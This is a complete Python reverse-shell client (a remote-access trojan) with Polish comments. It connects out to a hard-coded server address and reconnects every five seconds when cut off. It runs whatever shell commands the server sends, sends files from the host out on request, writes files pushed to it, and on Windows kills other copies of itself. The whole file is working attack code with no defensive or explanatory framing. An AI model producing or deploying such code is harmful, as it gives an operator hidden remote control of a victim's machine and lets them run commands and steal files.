
import socket
import subprocess
import os
import sys
import time

def start_client(ip, port):
    # --- MECHANIZM SINGLE INSTANCE ---
    # Pobiera nazwę pliku (np. client.exe lub client.py)
    current_file = os.path.basename(sys.executable if getattr(sys, 'frozen', False) else sys.argv[0])
    current_pid = os.getpid()
    
    # Próba ubicia starych instancji przed połączeniem
    if os.name == 'nt':  # Tylko dla Windows
        # Komenda zabija procesy o tej samej nazwie, ale innym PID
        os.system(f'taskkill /F /IM "{current_file}" /FI "PID ne {current_pid}" >nul 2>&1')
    # ---------------------------------

    while True:
        try:
            client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            client.connect((ip, port))
            
            while True:
                # Odbieramy surowe bajty
                raw_data = client.recv(4096)
                if not raw_data: break

                # Sprawdzamy instrukcje tekstowe
                try:
                    data = raw_data.decode('cp1250').strip()
                except:
                    data = ""

                # --- OBSŁUGA UPLOAD (Serwer -> Klient) ---
                if data.startswith("upload|"):
                    try:
                        _, name, size = data.split("|")
                        size = int(size)
                        filename = os.path.basename(name)
                        
                        curr = 0
                        with open(filename, "wb") as f:
                            while curr < size:
                                chunk = client.recv(min(8192, size - curr))
                                if not chunk: break
                                f.write(chunk)
                                curr += len(chunk)
                        
                        client.send(f"[+] File {filename} uploaded successfully.".encode())
                    except Exception as e:
                        client.send(f"[!] Upload failed: {e}".encode())

                # --- OBSŁUGA DOWNLOAD (Klient -> Serwer) ---
                elif data.startswith("download "):
                    try:
                        name = data.split(" ", 1)[1]
                        if os.path.exists(name):
                            filesize = os.path.getsize(name)
                            client.send(f"SIZE:{filesize}".encode())
                            with open(name, "rb") as f:
                                client.sendall(f.read())
                        else:
                            client.send(b"ERROR: File not found on client.")
                    except Exception as e:
                        client.send(f"ERROR: {e}".encode())

                # --- OBSŁUGA CD ---
                elif data.startswith("cd "):
                    try:
                        os.chdir(data[3:].strip())
                        client.send(os.getcwd().encode('cp1250'))
                    except Exception as e:
                        client.send(str(e).encode())

                # --- WYKONYWANIE KOMEND SYSTEMOWYCH ---
                else:
                    try:
                        # Używamy ignore w razie nietypowych znaków w komendzie
                        proc = subprocess.Popen(raw_data.decode(errors='ignore'), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
                        stdout, stderr = proc.communicate()
                        output = stdout + stderr
                        if not output:
                            client.send(b"Command executed (No output).")
                        else:
                            client.send(output)
                    except Exception as e:
                        client.send(f"Execution error: {e}".encode())

            client.close()
        except Exception:
            # Reconnect after 5 seconds if connection lost
            time.sleep(5)

if __name__ == "__main__":
    # IP Twojego serwera
    start_client("192.168.33.14", 25565)
